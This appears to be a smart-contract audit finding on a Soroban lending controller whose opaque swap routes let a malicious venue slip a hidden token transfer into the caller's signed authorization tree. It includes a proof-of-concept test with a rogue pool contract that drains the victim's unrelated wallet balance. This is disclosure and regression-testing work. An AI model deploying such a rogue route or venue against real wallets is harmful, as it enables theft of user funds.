### Title
Opaque swap routes can hide an attacker-initiated token transfer inside the caller's signed authorization tree - (File: `contracts/controller/src/strategies/swap.rs`)

### Summary
`swap_collateral` accepts an opaque `swap` byte payload and forwards it to the configured router. The router may invoke route-selected third-party venues, and a malicious venue can add a nested `token.transfer(victim, attacker, amount)` beneath the victim's `swap_collateral` authorization. If a wallet or client displays only the visible collateral swap while signing the full simulated authorization tree, the victim authorizes both the intended swap and the hidden wallet transfer.

### Finding Description
`process_swap_collateral` authenticates `caller`, withdraws the selected collateral, and passes the caller-supplied `swap` bytes into `withdraw_and_swap_from_supply`. [1](#0-0) 

`swap_tokens` authorizes only the controller's exact input-token transfer to the configured router, but then invokes `router.execute_strategy` with the opaque route payload. [2](#0-1) 

The controller's post-call checks measure only the swap input balance, reject overspending, refund unused input, and require a positive output balance. [3](#0-2) 

Those checks do not constrain what route-selected code does under the caller's authorization tree. The regression proof demonstrates that a route-hop contract can call `token.transfer(victim, attacker, amount)` for a completely unrelated wallet token. [4](#0-3) 

Simulation records that transfer as a child of the victim's `swap_collateral` authorization, and signing the simulated tree makes it executable. [5](#0-4) 

This is the same confirmation-binding class as the Trezor report: the user-visible operation describes the intended swap, while the signed authorization commits to additional effects embedded in the opaque route's execution.

### Impact Explanation
An attacker can steal arbitrary token balances from the victim's wallet, not merely the collateral submitted to the swap. In the regression proof, Alice loses her entire unrelated `WALLET_BALANCE` while still receiving the expected fair swap output. [6](#0-5) 

The theft bypasses the controller's accounting guarantees because the stolen token is not the strategy input or output. Positive measured output and successful final risk checks can therefore coexist with complete loss of another wallet asset.

### Likelihood Explanation
The attacker must get the victim to submit an attacker-crafted route. That is realistic for quoted route bytes supplied by a malicious frontend, API, or bot, especially because the route is opaque `Bytes` to the controller. [7](#0-6) 

No privileged protocol role, leaked key, oracle manipulation, or contract upgrade is required. The victim must sign the full authorization tree, so exploitation depends on the wallet/client failing to make that child transfer visible and understandable; hardware or compact displays that show only the root invocation create that condition.

### Recommendation
Do not allow route-selected contracts to execute arbitrary calls beneath the caller's authorization without explicit user-facing disclosure. At minimum:

- Ensure every route venue is resolved from a protocol-maintained allowlist rather than arbitrary payload addresses.
- Have the router invoke venue code under its own contract authorization and prevent venue calls from requesting the sender's authorization.
- Require clients and wallets to decode route XDR and display every nested authorization invocation, including token, sender, recipient, and amount.
- Reject signing when `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` produces any authorization child other than the expected controller-managed token transfer.
- Add a regression test asserting that production-shaped route execution cannot append an unrelated `token.transfer` under the caller's root authorization.

### Proof of Concept
The existing regression test constructs the complete exploit shape:

1. Alice owns a funded lending account and holds `77_770_000_000` units of an unrelated token.
2. The attacker encodes a route containing `RogueHopPool`, whose `swap` function calls `token::transfer(alice, attacker, WALLET_BALANCE)`. [4](#0-3) 
3. Alice calls `swap_collateral(alice, account_id, USDC, 50_000_000_000, ETH, route)` through the controller. [8](#0-7) 
4. Simulation records `token.transfer(alice, attacker, WALLET_BALANCE)` as a child authorization under `swap_collateral`. [9](#0-8) 
5. Signing that recorded tree executes the hidden transfer: Alice's unrelated token balance becomes zero and the attacker receives the full amount, while the swap still deposits its expected output. [10](#0-9)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap.rs (L21-38)
```rust
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);

    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-55)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L147-157)
```rust
    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```
